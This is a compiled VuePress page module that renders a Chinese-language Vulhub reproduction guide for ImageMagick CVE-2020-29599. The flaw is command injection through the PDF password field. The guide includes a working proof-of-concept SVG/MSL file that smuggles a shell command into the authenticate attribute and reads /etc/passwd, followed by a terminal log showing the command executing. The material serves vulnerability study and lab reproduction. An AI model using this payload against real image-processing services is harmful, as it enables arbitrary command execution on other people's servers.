import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as d,c as l,a as e,b as t,d as n,e as a}from"./app-58e4a7d6.js";const c={},r=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),u=e("p",null,"ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。研究者@insertScript 发现在Imagemagick 7.0.10-35到7.0.10-40、6.9.11-35 up到6.9.11-40处理PDF的过程中存在一处命令注入漏洞，通过构造好的SVG格式图片文件，即可在Imagemagick中注入任意命令。",-1),m=e("p",null,"参考链接：",-1),g={href:"https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html",target:"_blank",rel:"noopener noreferrer"},v=a(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub直接执行如下命令进入安装了Imagemagick 7.0.10-36的Linux环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose run im bash
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,4),p=e("code",null,"/tmp",-1),h={href:"https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2020-29599/poc.svg",target:"_blank",rel:"noopener noreferrer"},b=a(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>root@f200ec9e1c1e:/# cd /tmp/
root@f200ec9e1c1e:/tmp# ls
poc.svg
root@f200ec9e1c1e:/tmp# identify poc.svg
poc.svg SVG 700x700 700x700+0+0 16-bit sRGB 398B 0.000u 0:00.003
root@f200ec9e1c1e:/tmp# convert poc.svg poc.png
sh: 1: : Permission denied
convert: MagickCore/image.c:1168: DestroyImage: Assertion \`image != (Image *) NULL&#39; failed.
Aborted
root@f200ec9e1c1e:/tmp# ls
0wned  poc.svg
root@f200ec9e1c1e:/tmp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>查看poc.svg文件内容：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>root@a1b29c85d417:/tmp# strings poc.svg
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>poc.svg的内容如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;image authenticate=&#39;ff&quot; \`echo $(id)&gt; ./0wned\`;&quot;&#39;&gt;
  &lt;read filename=&quot;pdf:/etc/passwd&quot;/&gt;
  &lt;get width=&quot;base-width&quot; height=&quot;base-height&quot; /&gt;
  &lt;resize geometry=&quot;400x400&quot; /&gt;
  &lt;write filename=&quot;test.png&quot; /&gt;
  &lt;svg width=&quot;700&quot; height=&quot;700&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt;
  &lt;image xlink:href=&quot;msl:poc.svg&quot; height=&quot;100&quot; width=&quot;100&quot;/&gt;
  &lt;/svg&gt;
&lt;/image&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>此时命令<code>echo $(id)&gt; ./0wned</code>已执行成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241310727.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,7);function _(f,x){const i=o("ExternalLinkIcon");return d(),l("div",null,[r,u,m,e("ul",null,[e("li",null,[e("a",g,[t("https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html"),n(i)])])]),v,e("p",null,[t("进入"),p,t("目录，对"),e("a",h,[t("poc.svg"),n(i)]),t("进行格式转换，即可触发漏洞：")]),b])}const w=s(c,[["render",_],["__file","ImageMagick PDF密码位置命令注入漏洞 CVE-2020-29599.html.vue"]]);export{w as default};
